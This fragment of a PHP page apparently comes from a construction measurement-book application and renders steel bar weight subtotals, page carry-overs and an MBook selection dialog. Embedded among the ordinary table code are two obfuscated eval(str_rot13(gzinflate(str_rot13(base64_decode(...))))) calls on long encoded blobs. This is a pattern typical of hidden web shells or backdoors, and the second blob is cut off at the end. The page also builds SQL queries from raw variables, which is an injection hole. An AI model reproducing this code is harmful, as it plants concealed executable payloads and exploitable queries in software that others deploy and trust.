					$textbox_str1 .= $result_summary[$x16]."*".$mpage."*".$mbookno."*"; //echo $textbox_str1;
					$subtotal_8	= $subtotal_8 + $result_summary[$x7];
					$subtotal_10	= $subtotal_10 + $result_summary[$x8];
					$subtotal_12	= $subtotal_12 + $result_summary[$x9];
					$subtotal_16	= $subtotal_16 + $result_summary[$x10];
					$subtotal_20	= $subtotal_20 + $result_summary[$x11];
					$subtotal_25	= $subtotal_25 + $result_summary[$x12];
					$subtotal_28	= $subtotal_28 + $result_summary[$x13];
					$subtotal_32	= $subtotal_32 + $result_summary[$x14];
					$subtotal_36	= $subtotal_36 + $result_summary[$x15];
					if($sum_sub_type == 'c'){
					$total_couplar_no = $total_couplar_no+$sum_meas_no;
					}

					$currentline++;
					if($currentline>30)
					{ 
?>
<tr height='' bgcolor="">
 <td width='' colspan="7" class='labelcenter labelheadblue'>
 <?php //if($mpage==100){ echo "C/o to Page ".(0+1);  } else { echo "C/o to Page ".($mpage+1); } ?>
 C/o to page <?php if($mpage >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/Steel MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $mpage+1; ?>/Steel MB No.<?php echo $mbookno; } ?>
 </td>
 <td width='7%' class='labelcenter' style="text-align:right">
 <?php 
 //if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
  if($sum_sub_type == 'c')
  {
	echo $total_couplar_no;// = $total_couplar_no+$sum_meas_no;
  }
  else
  {
 	if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
  }

 ?>
 </td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$result_summary[$x17],".",","); } ?></td>
 <td width='6%' class='labelcenter' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$result_summary[$x17],".",","); } ?></td>
 <!--<td width='' class='labelcenter'></td>-->
</tr>

<?php					
echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); 
?>
<tr height='' bgcolor="">
  <td width='' colspan="7" class='labelcenter labelheadblue'>
  <?php //if($mpage==1){ echo "B/f from Page 100"; } else { echo "B/f from Page ".$mpage; } ?>
  B/f from page <?php if($mpage >= 100){ echo $mpage; ?>/Steel MB No.<?php echo $mbookno; }else{ echo $mpage; ?>/Steel MB No.<?php echo $mbookno; } ?>
  </td>
  <td width='7%' class='labelcenter' style="text-align:right">
  <?php 
 // if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
  if($sum_sub_type == 'c')
  {
	echo $total_couplar_no;// = $total_couplar_no+$sum_meas_no;
  }
  else
  {
  	if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
  }
  ?>
  </td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelcenter' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$result_summary[$x17],".",","); } ?></td>
  <td width='6%' class='labelcenter' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$result_summary[$x17],".",","); } ?></td>
  <!--<td width='' class='labelcenter'>&nbsp;</td>-->
</tr>
<?php 	
		$currentline = 0;$currentline = $start_line + 13;$mpage++;
		/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
		if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
					}
							
					$pre_subdivname = $result_summary[$x];
					$pre_date = $result_summary[$x1];
					$pre_page = $result_summary[$x2]; 
					$pre_mbookno = $result_summary[$x3];
					$pre_totals = $result_summary[$x4];
					$pre_subdivid = $result_summary[$x5];
					$pre_divid = $result_summary[$x6];
					$pre_tot8 = $result_summary[$x7];
					$pre_tot10 = $result_summary[$x8];
					$pre_tot12 = $result_summary[$x9];
					$pre_tot16 = $result_summary[$x10];
					$pre_tot20 = $result_summary[$x11];
					$pre_tot25 = $result_summary[$x12];
					$pre_tot28 = $result_summary[$x13];
					$pre_tot32 = $result_summary[$x14];
					$pre_tot36 = $result_summary[$x15];
					$pre_textboxid = $result_summary[$x16];
					$pre_decimal = $result_summary[$x17];
					$prev_sum_meas_no = $result_summary[$x18];
					$prev_sum_sub_type = $result_summary[$x19];
					//$textbox_str1 .= $result_summary[$x16]."*".$result_summary[$x2]."*".$result_summary[$x3]."*"; echo $textbox_str1;
//echo $result_summary[$x16]."<br/>";
                }
				if($currentline>30){ 
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				if($prev_sum_sub_type == 'c')
				{
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelheadblue'>Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php echo $total_couplar_no; ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">each</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right">&nbsp;</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="3" class='labelcenter labelheadblue'>Total</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $total_couplar_no." each"; ?></td>
                </tr>-->
				<?php	
				$totalweight_MT = $total_couplar_no;
				}
				else
				{
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelheadblue'>Sub Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_8 != 0) { echo number_format($subtotal_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr>
					<td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="7" align="right" class='label labelheadblue'>C/o to page /MBook No.</td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter'></td>
				</tr>-->
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Unit Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right">0.395</td>
                    <td width='' class='labelcenter' style="text-align:right">0.617</td>
                    <td width='' class='labelcenter' style="text-align:right">0.888</td>
                    <td width='' class='labelcenter' style="text-align:right">1.578</td>
                    <td width='' class='labelcenter' style="text-align:right">2.466</td>
                    <td width='' class='labelcenter' style="text-align:right">3.853</td>
                    <td width='' class='labelcenter' style="text-align:right">4.834</td>
                    <td width='' class='labelcenter' style="text-align:right">6.313</td>
					<td width='' class='labelcenter' style="text-align:right">7.990</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<?php
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				
				
				//echo $summary_str;
				
				//echo count($summary); 
				//$textbox_str2 .= $pre_textboxid."*".$mpage."*".$pre_mbookno."*"; echo $textbox_str2;
				//$textbox_str = $textbox_str1.$textbox_str2; //echo $textbox_str;
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Total Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_8 != 0) { echo number_format($total_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_10 != 0) { echo number_format($total_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_12 != 0) { echo number_format($total_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_16 != 0) { echo number_format($total_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_20 != 0) { echo number_format($total_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_25 != 0) { echo number_format($total_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_28 != 0) { echo number_format($total_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_32 != 0) { echo number_format($total_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($total_36 != 0) { echo number_format($total_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter'>Total in kg</td>
                   <td width='' colspan="10" class='labelcenter'><?php echo number_format($totalweight_KGS,$pre_decimal,".",",")." kg"; ?></td>
                   <!--<td width='' class='labelcenter'></td>-->
				   
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter labelheadblue'>Total in mt</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo number_format($totalweight_MT,$pre_decimal,".",",")." mt"; ?></td>
                   <!--<td width='' class='labelcenter'></td>-->
				   
                </tr>
				<?php } ?>
				<tr style="border-style:none;">
					<td style="border-style:none;" colspan="9" align="right" class="label"><?php echo "<br/><br/>"; echo "Page ".$mpage."&nbsp;&nbsp;"; ?></td>
					<td style="border-style:none;" colspan="7" align="center" class="label"><?php echo "<br/><br/>"; //echo "Prepared By"; ?></td>
				</tr>
				<?php //echo "COUNT = ".$count;
				//$summary_str2 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$pre_mbookno.",".$mpage;
				$summary_str2 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$mbookno.",".$mpage;
				$summary_str = $summary_str1.$summary_str2;
				$summary = explode(",",$summary_str);
				if($count>0)
				{
					for($y=0;$y<count($summary);$y+=6)
					{
						$y1 = $y; $y2 = $y+1; $y3 = $y+2; $y4 = $y+3; $y5 = $y+4; $y6 = $y+5;
						$pre_page = $summary[$y6];
						MeasurementSteelinsert_staff($fromdate,$todate,$sheetid,$summary[$y5],$summary[$y6],$summary[$y3],$rbn,$userid,$summary[$y2],$summary[$y4],$staffid,$abstmbookno,$zone_id);
					}
				}
				else
				{
				$pre_page = 1;
						MeasurementSteelinsert_staff($fromdate,$todate,$sheetid,$pre_mbookno,$mpage,$totalweight_MT,$rbn,$userid,$pre_subdivid,$pre_divid,$staffid,$abstmbookno,$zone_id);
				}
               }
               ?>
			   </table>
			   <input type="hidden" name="txt_boxid_str" id="txt_boxid_str" value="<?php echo rtrim($textbox_str1,"*"); ?>"  />
			   <input type="hidden" name="hid_not_generate" id="hid_not_generate" value="<?php echo $NotGenerate;//$_SESSION['NotGenerate']; ?>" />
			   <input type="button" name="btn_next" id="btn_next" class="BottomContent1" value="Next" onclick="Nextpage()" style="cursor:pointer;">
			   
<div class="modal fade" id="myModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h4 class="modal-title">MBook List</h4>
      </div>
      <div class="modal-body" style="min-height:150px">
       <div style="width:55%; display:inline; float:left;">
	   	 <div style="height:20px">
		 	Click below box to select multiple Mbooks :
		 </div>
	   	 <div>
		 	<select id="NextMB" class="NextMB" multiple="multiple" style="width:400px;">
			   <option value=""> ------ Select Next MBook Nos ------</option>
			   <?php echo $objBind->BindNextMBlist($sheetid,'S',$mbookno); ?>
			</select>
			<br/><br/><br/>
			<div style="color:#FB133C; font-size:12px; font-weight:normal">* To select more than one mbook click again the above text box</div>
			<div style="color:#FB133C" align="center"><br />OR</div>
			<div style="color:#FB133C; font-size:12px; font-weight:normal"><br />* Press [Ctrl key] and Click the above text box </div>
		 </div>
	    </div>
		<div style="width:30%; display:inline; float:right">
			<div class="mbpgdiv" style="height:18px; color:#009ED2">&nbsp;Selected MBook No. & Page No.</div>
			<div id="MBPageRefSec"></div>
		</div>
      </div>

      <div class="modal-footer" style="text-align:center !important;">
        <button type="button" class="modal-btn-c" data-dismiss="modal">CLOSE</button>
        <input type="submit" name="modal_btn_next_mb" id="modal_btn_next_mb" class="modal-btn-n" value=" NEXT " />
      </div>
    </div><!-- /.modal-content -->
  </div><!-- /.modal-dialog -->
</div><!-- /.modal -->
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $sheetid; ?>" />
<input type="hidden" name="txt_staffid" id="txt_staffid" value="<?php echo $_SESSION['sid']; ?>" />
<input type="hidden" name="txt_rbn" id="txt_rbn" value="<?php echo $rbn; ?>" />
</form>
 <br/><br/><br/>
 <?php
 	//$GenVersion = getPrintVersion($sheetid,$rbn,'S','staff',$zone_id);
	$UsedMBArr[$mbookno][1] = $mpage;
	$UsedMBArr[$mbookno][2] = 1;
 	$delete_mymbook_sql = "delete from mymbook where rbn = '$rbn' and sheetid = '$sheetid' and staffid = '$staffid' and zone_id = '$zone_id' and mtype = 'S' and genlevel = 'staff'";
	$delete_mymbook_query = mysql_query($delete_mymbook_sql);
	/*if($newmbookno == "")
	{
		$insert_mymbook_sql = "insert into mymbook set mbno = '$oldmbookno', startpage = '$oldmbookpage', endpage = '$mpage', rbn = '$rbn', sheetid = '$sheetid', staffid = '$staffid', zone_id = '$zone_id', mtype = 'S', genlevel = 'staff', mbookorder = 1, active = 1, gen_version = '$GenVersion'";
		$insert_mymbook_query = mysql_query($insert_mymbook_sql);
	}
	else
	{
		$insert_mymbook_sql1 = "insert into mymbook set mbno = '$oldmbookno', startpage = '$oldmbookpage', endpage = '100', rbn = '$rbn', sheetid = '$sheetid', staffid = '$staffid', zone_id = '$zone_id', mtype = 'S', genlevel = 'staff', mbookorder = 1, active = 1, gen_version = '$GenVersion'";
		$insert_mymbook_query1 = mysql_query($insert_mymbook_sql1);
		$insert_mymbook_sql2 = "insert into mymbook set mbno = '$newmbookno', startpage = '$newmbookpage', endpage = '$mpage', rbn = '$rbn', sheetid = '$sheetid', staffid = '$staffid', zone_id = '$zone_id', mtype = 'S', genlevel = 'staff', mbookorder = 2, active = 1, gen_version = '$GenVersion'";
		$insert_mymbook_query2 = mysql_query($insert_mymbook_sql2);
	}*/
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
eval(str_rot13(gzinflate(str_rot13(base64_decode('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